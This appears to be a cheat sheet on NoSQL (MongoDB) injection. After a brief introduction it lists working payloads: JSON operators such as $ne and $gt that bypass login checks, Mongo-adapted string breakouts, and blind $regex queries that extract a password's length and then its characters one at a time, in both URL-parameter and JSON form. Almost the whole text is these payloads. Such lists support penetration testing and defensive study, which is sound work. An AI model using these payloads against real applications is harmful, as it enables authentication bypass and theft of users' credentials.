```
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax
```
```
#in JSON

{"username": {"$ne": null}, "password": {"$ne": null} }

{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }

{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```


**SQL - Mongo**[](#sql-mongo)
```

Normal sql: ' or 1=1-- -

Mongo sql: ' || 1==1// or ' || 1==1%00
```



### Extract **length** information[](#extract-length-information)
```
username[$ne]=toto&password[$regex]=.{1}

username[$ne]=toto&password[$regex]=.{3}

# True if the length equals 1,3...
```
###  Extract **data** information[](#extract-data-information)
```
in URL (if length == 3)

username[$ne]=toto&password[$regex]=a.{2}

username[$ne]=toto&password[$regex]=b.{2}

...

username[$ne]=toto&password[$regex]=m.{2}

username[$ne]=toto&password[$regex]=md.{1}

username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*

username[$ne]=toto&password[$regex]=md.*

in JSON

{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}

{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}

{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
